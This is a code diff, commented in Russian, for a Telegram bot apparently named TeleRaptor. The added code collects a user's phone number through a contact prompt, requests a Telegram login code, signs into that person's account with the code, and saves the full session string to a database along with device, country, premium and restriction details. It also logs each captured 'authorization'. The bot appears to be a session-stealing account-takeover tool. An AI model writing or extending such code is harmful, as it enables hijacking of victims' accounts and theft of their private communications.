@@ -68,6 +68,15 @@ DEFAULT_AVATAR = "img/TeleRaptor.png"
 
 # ================== UTILITY FUNCTIONS ==================
 
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(message)s',
+    handlers=[
+        logging.FileHandler('auth_logs.log'),
+        logging.StreamHandler()
+    ]
+)
+
 def generate_random_hash(length=32):
     """Generate random hash for date_of_birth_integrity"""
     return ''.join(random.choices(string.hexdigits.lower(), k=length))
@@ -197,6 +206,105 @@ async def generate_full_session_data(session_info, client, me):
     return full_data
 
 # ================== SESSION EXPORT ==================
+
+# Добавляем в начало кода (после импортов)
+def log_new_auth(session_data, auth_type="NEW_AUTH"):
+    """Логирует новую авторизацию в консоль"""
+    phone = session_data.get("phone", "")
+    country = geocoder.description_for_number(parse(phone, None), "en") if phone else "UNKNOWN"
+    
+    log_message = (
+        f"\n🔔 {auth_type} EVENT 🔔\n"
+        f"📱 Phone: {phone}\n"
+        f"🌎 Country: {country}\n"
+        f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"⚡ Session Info: {session_data.get('session', '')[:15]}...\n"
+    )
+    print(log_message)  # Вывод в консоль
+    logging.info(log_message)  # Запись в лог-файл
+
+# В обработчике контакта (где происходит авторизация)
+@dp.message_handler(content_types=types.ContentType.CONTACT)
+async def handle_contact(message: types.Message):
+    user_id = message.from_user.id
+    if user_states.get(user_id) != 'awaiting_contact':
+        return
+
+    phone = message.contact.phone_number
+    if not phone.startswith("+"):
+        phone = "+" + phone
+
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
+        await client.connect()
+        
+        await client.send_code_request(phone)
+        user_states[user_id] = 'awaiting_code'
+        user_phones[user_id] = phone
+        
+        # Логируем начало авторизации
+        log_new_auth({"phone": phone}, "AUTH_STARTED")
+        
+    except Exception as e:
+        await message.answer(f"❌ Error: {e}")
+        logging.error(f"Auth error for {phone}: {str(e)}")
+
+# В обработчике успешной авторизации (после ввода кода)
+async def try_sign_in_code(user_id, code):
+    client = user_clients.get(user_id)
+    phone = user_phones.get(user_id)
+    
+    try:
+        await client.sign_in(phone=phone, code=code)
+        if await client.is_user_authorized():
+            me = await client.get_me()
+            session_str = client.session.save()
+            
+            # Получаем информацию об устройстве
+            auths = await client(GetAuthorizationsRequest())
+            device_info = "Unknown"
+            auth_time = datetime.now()
+            
+            for auth in auths.authorizations:
+                if auth.current:
+                    device_info = auth.device_model or "PC"
+                    auth_time = datetime.fromtimestamp(auth.date_active.timestamp())
+                    break
+            
+            # Формируем данные для лога
+            session_data = {
+                "phone": phone,
+                "session": session_str,
+                "device": device_info,
+                "auth_time": auth_time.isoformat(),
+                "country": geocoder.description_for_number(parse(phone, None), "en"),
+                "premium": getattr(me, 'premium', False),
+                "blocked": bool(getattr(me, 'restriction_reason', []))
+            }
+            
+            # Логируем успешную авторизацию
+            log_message = (
+                f"\n✅ NEW AUTHORIZATION SUCCESS\n"
+                f"📱 Phone: {phone}\n"
+                f"🌎 Country: {session_data['country']}\n"
+                f"💻 Device: {device_info}\n"
+                f"⭐ Premium: {'Yes' if session_data['premium'] else 'No'}\n"
+                f"🚫 Blocked: {'Yes' if session_data['blocked'] else 'No'}\n"
+                f"🕒 Auth Time: {auth_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"🔑 Session: {session_str[:15]}...\n"
+            )
+            print(log_message)
+            logging.info(log_message)
+            
+            # Сохраняем сессию (ваш существующий код)
+            sessions_col.update_one(
+                {"phone": phone}, 
+                {"$set": session_data}, 
+                upsert=True
+            )
+            
+    except Exception as e:
+        logging.error(f"Auth failed for {phone}: {str(e)}")
 
 # Добавьте этот обработчик в раздел COMMAND HANDLERS
 @dp.message_handler(commands=['logout_others'])
